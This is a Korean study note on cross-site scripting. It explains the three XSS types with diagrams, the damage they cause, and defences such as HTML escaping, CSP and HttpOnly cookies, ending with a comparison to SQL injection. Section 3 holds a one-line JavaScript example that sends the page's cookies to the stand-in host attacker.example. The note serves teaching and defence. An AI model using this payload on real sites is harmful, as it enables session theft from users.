## XSS(Cross-Site Scripting)

**XSS**는 공격자가 웹 페이지에 악성 스크립트를 삽입하여, 그 페이지를 보는 **다른 사용자의 브라우저**에서 스크립트가 실행되게 하는 취약점이다. 사용자 입력이 검증 없이 화면에 출력될 때 발생하며, 세션 탈취·피싱 등으로 이어진다. OWASP A03(인젝션)에 속한다.

<br>

### 1. 원리

애플리케이션이 사용자 입력을 **이스케이프 없이 HTML/스크립트로 출력**할 때, 입력에 담긴 `<script>` 같은 코드가 실행된다.

- 정상 의도: 입력값을 화면에 **텍스트**로만 표시
- 공격: 입력값에 `<script>` 등을 넣어 **브라우저가 코드로 실행**하게 만듦

```html
<!-- 게시글 내용이 그대로 출력되는 취약한 페이지 -->
<div><script>/* 공격자가 심은 스크립트가 실행됨 */</script></div>
```

<br>

### 2. XSS의 3가지 유형

XSS는 악성 스크립트가 어디에 저장되고 어떻게 전달되는지에 따라 세 가지로 나뉜다.

### 2-1. Stored XSS (저장형)

악성 스크립트가 **서버 DB에 저장**되어, 해당 페이지를 여는 모든 사용자에게 실행된다. 피해 범위가 가장 넓다.

```
[공격자] 게시글에 악성 스크립트 작성
              │
              ▼
        [서버 DB에 저장]
              │
              ▼
[피해자들] 게시글 열람 → 각자의 브라우저에서 스크립트 실행
```

<br>

### 2-2. Reflected XSS (반사형)

스크립트가 **URL 파라미터** 등에 담겨 서버 응답에 그대로 반사된다. 공격자는 악성 링크를 만들어 피해자를 유도한다.

```
[공격자] 악성 스크립트가 담긴 URL 제작
              │
              ▼
[피해자] 링크 클릭 → 서버가 파라미터를 그대로 응답에 포함
              │
              ▼
      피해자 브라우저에서 스크립트 실행
```

<br>

### 2-3. DOM-based XSS

서버를 거치지 않고, **클라이언트 자바스크립트**가 URL 등의 입력을 DOM에 직접 삽입하는 과정에서 실행된다.

```
[피해자] 악성 파라미터가 담긴 URL 접속
              │
              ▼
[브라우저의 JS] location.hash 등을 innerHTML에 삽입
              │
              ▼
        DOM에서 스크립트 실행 (서버 미경유)
```

<br>

### 2-4. 유형 비교

| **유형**     | **스크립트 위치** | **서버 경유** | **피해 범위**        |
| ------------ | ----------------- | ------------- | -------------------- |
| **Stored**   | 서버 DB           | O             | 페이지 열람자 전체    |
| **Reflected** | URL·요청 파라미터 | O             | 링크를 클릭한 사용자  |
| **DOM-based** | 클라이언트 DOM    | X             | 링크를 클릭한 사용자  |

<br>

### 3. 공격 예시 (개념 수준)

대표적인 악용은 브라우저에 저장된 **쿠키를 외부로 전송**해 세션을 탈취하는 것이다.

```javascript
// 개념 예시 — 쿠키를 공격자 서버로 보내려는 시도
// document.cookie 에 담긴 세션 정보가 유출될 수 있다
new Image().src = "http://attacker.example/steal?c=" + document.cookie;
```

<br>

### 4. 피해

- **세션 쿠키 탈취**로 로그인 세션 가로채기(세션 하이재킹)
- 가짜 로그인 폼을 띄우는 **피싱**
- 입력을 가로채는 **키로깅**, 페이지 변조

> ⚠️ XSS는 서버가 아니라 **다른 사용자의 브라우저**를 공격한다. 서버 자체는 멀쩡해 보여도 이용자들이 대규모로 피해를 입을 수 있다.

<br>

### 5. 방어 — 출력 이스케이프

가장 기본적이고 확실한 방어는 사용자 입력을 출력할 때 **HTML 특수문자를 엔티티로 변환**하여 코드가 아닌 텍스트로 표시되게 하는 것이다.

| **원본 문자** | **HTML 엔티티** |
| ------------- | --------------- |
| **`<`**       | `&lt;`          |
| **`>`**       | `&gt;`          |
| **`&`**       | `&amp;`         |
| **`"`**       | `&quot;`        |
| **`'`**       | `&#x27;`        |

`<script>`가 `&lt;script&gt;`로 변환되면 브라우저는 이를 실행하지 않고 글자 그대로 보여준다.

<br>

### 6. 추가 방어 대책

- **입력값 검증**: 허용된 문자·태그만 통과시킨다(화이트리스트)
- **CSP(Content-Security-Policy) 헤더**: 실행 가능한 스크립트 출처를 제한한다

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

> 💡 세션 쿠키에 **HttpOnly** 속성을 설정하면 자바스크립트에서 `document.cookie`로 쿠키에 접근할 수 없다. XSS가 발생해도 세션 쿠키 탈취를 막는 중요한 방어선이다.

<br>

### 7. SQL 인젝션과의 차이

같은 인젝션 계열이지만 **공격 대상**이 다르다.

| **구분**     | **XSS**                  | **SQL 인젝션**         |
| ------------ | ------------------------ | ---------------------- |
| **공격 대상** | 다른 사용자의 **브라우저** | 서버의 **데이터베이스** |
| **실행 위치** | 클라이언트 측            | 서버 측                |
| **핵심 방어** | 출력 이스케이프·CSP      | Prepared Statement     |

❗️**시험 포인트**: "XSS는 클라이언트(브라우저), SQL 인젝션은 서버(DB)를 노린다"는 대비는 면접·자격증 단골 질문이다.
